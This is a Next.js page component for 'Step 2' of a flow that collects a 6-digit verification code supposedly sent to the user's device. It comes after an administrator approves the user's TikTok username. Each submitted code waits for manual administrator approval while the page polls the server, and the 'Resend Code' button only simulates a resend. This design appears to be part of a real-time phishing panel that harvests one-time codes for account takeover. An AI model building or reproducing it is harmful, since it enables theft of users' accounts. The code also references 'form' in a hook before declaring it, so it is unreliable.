
'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { ArrowLeft, KeyRound, Loader2, AlertCircle } from 'lucide-react';
import { useRouter } from 'next/navigation';
import { useForm } from 'react-hook-form';
import * as z from 'zod';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/hooks/use-auth';
import useSWR from 'swr';
import { useEffect, useState, useCallback } from 'react';

import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormMessage } from '@/components/ui/form';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { Progress } from '@/components/ui/progress';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import type { Submission } from '@/lib/types';
import { useInterval } from '@/hooks/use-interval';


const formSchema = z.object({
  verificationCode: z.string().length(6, "Code must be 6 digits."),
});

type FormValues = z.infer<typeof formSchema>;

const fetcher = (url: string) => fetch(url).then(res => {
    if (res.status === 404) return null;
    if (!res.ok) throw new Error('An error occurred while fetching the data.');
    return res.json();
});

export default function VerifyCodePage() {
    const router = useRouter();
    const { user } = useAuth();
    const { toast } = useToast();

    const { data: submission, error } = useSWR<Submission | null>(user ? `/api/submissions?id=${user.uid}` : null, fetcher, { refreshInterval: 2000 });
    
    const [countdown, setCountdown] = useState(30);
    const [canResend, setCanResend] = useState(false);

    useInterval(() => {
        if (countdown > 0) {
            setCountdown(prev => prev - 1);
        } else {
            setCanResend(true);
        }
    }, canResend ? null : 1000);

    const handleResendCode = useCallback(() => {
        setCanResend(false);
        setCountdown(30);
        toast({
            title: 'Code Resent',
            description: 'A new verification code has been sent (simulation).',
        });
    }, [toast]);
    
     useEffect(() => {
        if (submission) {
            if (submission.tiktokUsernameStatus !== 'approved') {
                router.replace('/start');
                return;
            }
            if (submission.verificationCodeStatus === 'approved') {
                router.push('/start/select-number');
                return;
            }
            if (submission.verificationCode) {
                form.reset({ verificationCode: submission.verificationCode });
            }
        }
    }, [submission, router, form]);

    const form = useForm<FormValues>({
        resolver: zodResolver(formSchema),
        defaultValues: { verificationCode: '' },
    });

    const onSubmit = async (values: FormValues) => {
        if (!user) return toast({ variant: 'destructive', title: 'Error', description: 'You must be logged in.' });

        try {
             await fetch('/api/submissions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: user.uid,
                    step: 'verificationCode',
                    data: values.verificationCode,
                }),
            });
            toast({ title: 'Code Submitted', description: 'Please wait for admin approval.' });
        } catch (err: any) {
            toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
        }
    };
    
    const isLoading = form.formState.isSubmitting || (user && submission === undefined && !error);
    const isPending = submission?.verificationCodeStatus === 'pending' && !!submission.verificationCode;
    const isRejected = submission?.verificationCodeStatus === 'rejected';

    return (
        <div className="w-full max-w-lg">
             <div className="text-center mb-8">
                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
                    <KeyRound className="h-8 w-8" />
                </div>
                <h1 className="text-2xl font-bold">Step 2: Verification Code</h1>
                <p className="text-muted-foreground">Enter the 6-digit code sent to your device.</p>
            </div>

            <Progress value={50} className="w-[80%] mx-auto mb-8" />
            
             {isPending && (
                 <Alert className="mb-6 animate-pulse">
                    <AlertCircle className="h-4 w-4" />
                    <AlertTitle>Approval Pending</AlertTitle>
                    <AlertDescription>An administrator is currently verifying your code. This page will automatically update once approved.</AlertDescription>
                </Alert>
            )}

             {isRejected && (
                 <Alert variant="destructive" className="mb-6">
                    <AlertCircle className="h-4 w-4" />
                    <AlertTitle>Incorrect OTP</AlertTitle>
                    <AlertDescription>
                        The code you entered was incorrect. Please try again.
                         <Button variant="link" onClick={handleResendCode} className="p-0 h-auto ml-1" disabled={!canResend}>Resend Code</Button>
                    </AlertDescription>
                </Alert>
            )}

            <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                    <FormField
                        control={form.control}
                        name="verificationCode"
                        render={({ field }) => (
                            <FormItem>
                            <FormControl>
                                <div className="flex justify-center">
                                <InputOTP maxLength={6} {...field} disabled={isLoading || isPending}>
                                    <InputOTPGroup>
                                        <InputOTPSlot index={0} />
                                        <InputOTPSlot index={1} />
                                        <InputOTPSlot index={2} />
                                        <InputOTPSlot index={3} />
                                        <InputOTPSlot index={4} />
                                        <InputOTPSlot index={5} />
                                    </InputOTPGroup>
                                </InputOTP>
                                </div>
                            </FormControl>
                            <FormMessage className="text-center" />
                            </FormItem>
                        )}
                    />

                    <div className="text-center text-sm text-muted-foreground">
                        {canResend ? (
                            <Button type="button" variant="link" onClick={handleResendCode} className="p-0 h-auto">
                                Resend Code
                            </Button>
                        ) : (
                            <p>Resend code in {countdown}s</p>
                        )}
                    </div>
                    
                    <div className="flex justify-between pt-4">
                         <Button type="button" variant="outline" size="lg" className="rounded-full" onClick={() => router.back()} disabled={isLoading || isPending}>
                            <ArrowLeft className="mr-2 h-5 w-5" />
                            Back
                        </Button>
                        <Button type="submit" size="lg" className="rounded-full" disabled={isLoading || isPending || isRejected}>
                            {(isLoading || isPending) && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                            {isPending ? 'Waiting for Approval...' : 'Submit for Approval'}
                        </Button>
                    </div>
                </form>
            </Form>
        </div>
    );
}
